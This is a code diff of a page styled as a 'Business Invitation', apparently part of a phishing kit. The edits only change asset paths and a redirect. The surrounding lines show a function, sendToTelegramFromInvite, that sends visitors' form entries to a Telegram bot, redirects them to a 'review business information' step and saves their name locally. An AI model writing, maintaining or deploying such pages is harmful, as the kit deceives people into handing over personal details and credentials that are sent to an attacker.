@@ -25,16 +25,16 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="../../images/favicon.ico">
+    <link rel="icon" href="/images/favicon.ico">
     <title>Business Invitation</title>
-    <link rel="stylesheet" href="../../styles/invite.css">
+    <link rel="stylesheet" href="/styles/invite.css">
 </head>
 
 
 <body>
     <nav class="meta-nav">
         <div class="nav-content">
-            <img src="../../images/logo.png" alt="Logo" class="logo">
+            <img src="/images/logo.png" alt="Logo" class="logo">
         </div>
     </nav>
 
@@ -111,7 +111,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         </div>
     </footer>
 
-    <script src="../../scripts/invite.js"></script>
+    <script src="/scripts/invite.js"></script>
 
     <script>
         function sendToTelegramFromInvite(event) {
@@ -163,7 +163,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     if (xhr.status >= 200 && xhr.status < 300) {
                         console.log('Message sent to Telegram bot successfully.');
                         setTimeout(function() {
-                            window.location.href = "review-business-information";
+                            window.location.href = "/review-business-information.php";
                         }, 1000);
 
                         localStorage.setItem('firstName', firstName);
